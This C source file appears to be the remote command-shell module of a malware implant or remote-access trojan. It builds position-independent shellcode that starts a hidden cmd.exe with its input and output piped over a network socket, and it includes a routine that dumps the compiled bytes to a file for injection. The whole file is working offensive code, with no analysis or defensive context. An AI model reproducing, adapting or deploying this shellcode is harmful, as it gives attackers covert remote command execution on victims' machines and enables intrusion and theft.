#include "global_data.h"
#include "shellcodes.h"

extern void __cdecl cmd_shell_entry(global_data_t *global_data);
extern int __cdecl  cmd_shell_initialize(global_data_t *global_data, SOCKET s);
extern bool __cdecl cmd_shell_check(global_data_t *global_data);
extern int __cdecl cmd_shell_send_result(global_data_t *global_data, SOCKET s);
extern int __cdecl cmd_shell_execute(global_data_t *global_data, SOCKET s, const char *cmd);
extern int __cdecl cmd_shell_finalize(global_data_t *global_data, SOCKET s);
extern void __cdecl cmd_shell_code_end();

#pragma pack(push)
#pragma pack(1)
typedef struct {
  wchar_t comspec[10];
  wchar_t windir[9];
} cmd_shell_data_t;
#pragma pack(pop)

#define FIX(name)   xcmd_shell.##name = (_##name)(delta + (char *)name)

#pragma optimize("ts", on)

void __cdecl cmd_shell_entry(global_data_t *global_data) {
  uint32_t delta;

  __asm {
    call x;
  x:
    pop	eax;
    sub	eax, offset x;
    mov	delta, eax
  }

  xcmd_shell.data = (void *)(delta + (char *)cmd_shell_code_end);

  FIX(cmd_shell_initialize);
  FIX(cmd_shell_send_result);
  FIX(cmd_shell_execute);
  FIX(cmd_shell_finalize);
}

int __cdecl cmd_shell_initialize(global_data_t *global_data, SOCKET s) {
  extra_t *extra = extra_data();
  cmd_shell_data_t *data = (cmd_shell_data_t *)xcmd_shell.data;

  extra->state |= STATE_CMD_SHELL;

  SECURITY_ATTRIBUTES sa;

  sa.nLength = sizeof(sa);
  sa.lpSecurityDescriptor = 0;
  sa.bInheritHandle = TRUE;

  xCreatePipe(&xcmd_shell.input_read, &xcmd_shell.input_write, &sa, 0);
  xCreatePipe(&xcmd_shell.output_read, &xcmd_shell.output_write, &sa, 0);

  STARTUPINFOW si;

  zero_memory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.hStdOutput = xcmd_shell.output_write;
  si.hStdError = xcmd_shell.output_write;
  si.hStdInput = xcmd_shell.input_read;
  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
  si.wShowWindow = SW_HIDE;

  wchar_t cmd_path[MAX_PATH];
  wchar_t current_path[MAX_PATH];

  PROCESS_INFORMATION pi;

  xExpandEnvironmentStringsW(data->comspec, cmd_path, sizeof(cmd_path));
  xExpandEnvironmentStringsW(data->windir, current_path, sizeof(current_path));

  xCreateProcessW(0, cmd_path, &sa, &sa, TRUE, 0, 0, current_path, &si, &pi);

  xcmd_shell.cmd_handle = pi.hProcess;
  xCloseHandle(pi.hThread);

  int ret = xsend_packet(s, CMD_CMDSHELL_START, 0, 0);

  return ret;
}

bool __cdecl cmd_shell_check(global_data_t *global_data) {
  DWORD exit_code;

  exit_code = 0;
  xGetExitCodeProcess(xcmd_shell.cmd_handle, &exit_code);

  return exit_code == STILL_ACTIVE;
}

extern int __cdecl cmd_shell_send_result(global_data_t *global_data, SOCKET s) {
  DWORD length, temp, readed;

  if (!cmd_shell_check(global_data)) {
    return cmd_shell_finalize(global_data, s);
  }

  xPeekNamedPipe(xcmd_shell.output_read, 0, 0, 0, &length, 0);

  if (length <= 0) return 0;

  char *data = alloc_memory(length + 1);

  readed = 0;
  while (readed < length) {
    if (!xReadFile(xcmd_shell.output_read, data + readed, length - readed, &temp, 0)) {
      return cmd_shell_finalize(global_data, s);
    }
    readed += temp;
  }
  data[length] = 0;

  int ret = 0;

  buffer_t *buf = xbuffer_new();

  mlp_bin(buf, data, length + 1);

  free_memory(data);

  ret = xsend_packet(s, CMD_CMDSHELL_DATA, (const char *)buf->data, buf->size);

  xbuffer_free(buf);

  return ret;
}

int __cdecl cmd_shell_execute(global_data_t *global_data, SOCKET s, const char *cmd) {
  DWORD length, temp, writed;

  if (!cmd_shell_check(global_data)) {
    return cmd_shell_finalize(global_data, s);
  }

  length = xlstrlenA(cmd);
  writed = 0;
  while (writed < length) {
    if (!xWriteFile(xcmd_shell.input_write, cmd + writed, length - writed, &temp, 0)) {
      return cmd_shell_finalize(global_data, s);
    }
    writed += temp;
  }

  return cmd_shell_send_result(global_data, s);
}

int __cdecl cmd_shell_finalize(global_data_t *global_data, SOCKET s) {
  extra_data()->state &= ~STATE_CMD_SHELL;

  xTerminateProcess(xcmd_shell.cmd_handle, 0);
  xCloseHandle(xcmd_shell.input_read);
  xCloseHandle(xcmd_shell.input_write);
  xCloseHandle(xcmd_shell.output_write);
  xCloseHandle(xcmd_shell.output_read);

  if (s != INVALID_SOCKET) {
    return xsend_packet(s, CMD_CMDSHELL_END, 0, 0);
  }

  return 0;
}

void __cdecl cmd_shell_code_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

#undef FIX             // undef macro FIX

void cmd_shell_save(char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)cmd_shell_entry;
  end = (char *)cmd_shell_code_end;

  printf("[*] cmd shell code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");
  fwrite(start, 1, end - start, f);


  cmd_shell_data_t data;

  memset(&data, 0, sizeof(data));
  lstrcpyW(data.comspec, L"%COMSPEC%");
  lstrcpyW(data.windir, L"%WINDIR%");

  printf("[*] cmd shell data size = 0x%X\n", sizeof(data));

  fwrite(&data, 1, sizeof(data), f);

  fclose(f);
  printf("[*] save cmd shell to %s success.\n", filename);
}